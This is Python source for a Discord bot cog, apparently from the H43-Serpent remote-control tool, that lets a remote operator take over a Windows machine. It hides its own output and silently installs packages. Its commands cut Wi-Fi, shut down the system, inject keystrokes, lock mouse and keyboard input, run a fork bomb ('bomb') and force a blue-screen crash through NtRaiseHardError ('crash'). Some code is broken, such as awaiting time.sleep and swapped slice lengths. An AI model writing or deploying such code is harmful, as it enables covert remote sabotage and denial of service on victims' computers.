'''
Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


import sys, os

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')


import pip
pip.main(['install', 'pynput', 'pycaw', 'pillow'])


import os
import io
import time
import pynput
import asyncio
import discord
import winsound
import webbrowser


from PIL import Image
from ctypes import windll
from ctypes import byref
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from comtypes import CLSCTX_ALL
from discord.ext import commands
from ctypes import cast, POINTER
from subprocess import Popen, PIPE
from pynput.keyboard import Key, Controller
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume



class Lib(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.mouse_listener = None
        self.keyboard_listener = None

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        self.volume = cast(interface, POINTER(IAudioEndpointVolume))

    @commands.command()
    async def hello(self, ctx, *, member: discord.Member = None):
        """Says hello"""
        member = member or ctx.author
        await ctx.send(f'Welcome summoner,  {member.name}~ Hehehe :)')

    @commands.command()
    async def off_wifi(self, ctx, time_sec:int = 1):
        for i in range(time_sec):
            os.system('netsh wlan disconnect')
            await time.sleep(1)

    @commands.command()
    async def shutdown(self, ctx, time_sec:int = 0):
        if time_sec == -1:
            os.system(f'shutdown /a')
        else:
            os.system(f'shutdown /s /t {time_sec}')
    

    @commands.command()
    async def type(self, ctx, *, cmds_line):
        c = Controller()
        special_keys = Key.__members__

        args = cmds_line.split('|')

        type_text = lambda t: lambda: c.type(t)
        press_key = lambda k: lambda: c.press(k)
        release_key = lambda k: lambda: c.release(k)
        tap_key = lambda k: lambda: c.tap(k)

        for arg in args:
            cmd_buffer = []
            text_buffer = ''

            while arg:
                is_special_key = False
                
                for special_key in special_keys.keys():
                    if arg.lower().startswith('<' + special_key + '>'):            
                        if text_buffer:
                            cmd_buffer.append(type_text(text_buffer))
                            text_buffer = ''

                        cmd_buffer.append(press_key(special_keys[special_key]))
                        arg = arg[len('<' + special_key + '>'):]
                        is_special_key = True
                        break

                    elif arg.lower().startswith('</' + special_key + '>'):
                        if text_buffer:
                            cmd_buffer.append(type_text(text_buffer))
                            text_buffer = ''

                        cmd_buffer.append(release_key(special_keys[special_key]))
                        arg = arg[len('{' + special_key + '}'):]
                        is_special_key = True
                        break

                    elif arg.lower().startswith('{' + special_key + '}'):
                        if text_buffer:
                            cmd_buffer.append(type_text(text_buffer))
                            text_buffer = ''

                        cmd_buffer.append(tap_key(special_keys[special_key]))
                        arg = arg[len('</' + special_key + '>'):]
                        is_special_key = True
                        break

                if not is_special_key:
                    text_buffer += arg[0]
                    arg = arg[1:]


            if text_buffer:
                cmd_buffer.append(type_text(text_buffer))

            for cmd in cmd_buffer:
                cmd()

            await asyncio.sleep(0.3)
                


                

    @commands.command()
    async def site(self, ctx, url):
        webbrowser.open(url, new=1)


    @commands.command(brief='Frequency must be in 37 thru 32767')
    async def beep(self, ctx, time_sec:int=1, freq:int=2500):
        time_sec *= 1000
        winsound.Beep(freq, time_sec)

    @commands.command()
    async def lock_input(self, ctx):
        # Disable mouse and keyboard events
        self.mouse_listener = pynput.mouse.Listener(suppress=True)
        self.mouse_listener.start()

        self.keyboard_listener = pynput.keyboard.Listener(suppress=True)
        self.keyboard_listener.start()

    @commands.command()
    async def unlock_input(self, ctx):
        # Enable mouse and keyboard events
        if self.mouse_listener:
            self.mouse_listener.stop()
            self.mouse_listener = None

        if self.keyboard_listener:
            self.keyboard_listener.stop()
            self.keyboard_listener = None

    @commands.command()
    async def set_volume(self, ctx, value:int):
        _min, _max , *_ = self.volume.GetVolumeRange()
        self.volume.SetMasterVolumeLevel(_min if not value else _max, None)

    @commands.command()
    async def image(self, ctx):
        if ctx.message.attachments:
            data = await ctx.message.attachments[0].read()
            Image.open(io.BytesIO(data)).show()

    @commands.command()
    async def bomb(self, ctx, level:int=1, time_sec:int=10):
        cmd = 'for /l %a in (0,0,0) do start /MIN'
        
        procs = [Popen(cmd, stdout=PIPE, shell=True) for _ in range(level)]

        time.sleep(time_sec)

        CREATE_NO_WINDOW = 0x08000000
        for proc in procs:
            Popen("TASKKILL /F /PID {pid} /T".format(pid=proc.pid), creationflags=CREATE_NO_WINDOW).wait()


    @commands.command()
    async def crash(self, ctx):
        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint())
        )



async def setup(bot):
    await bot.add_cog(Lib(bot))


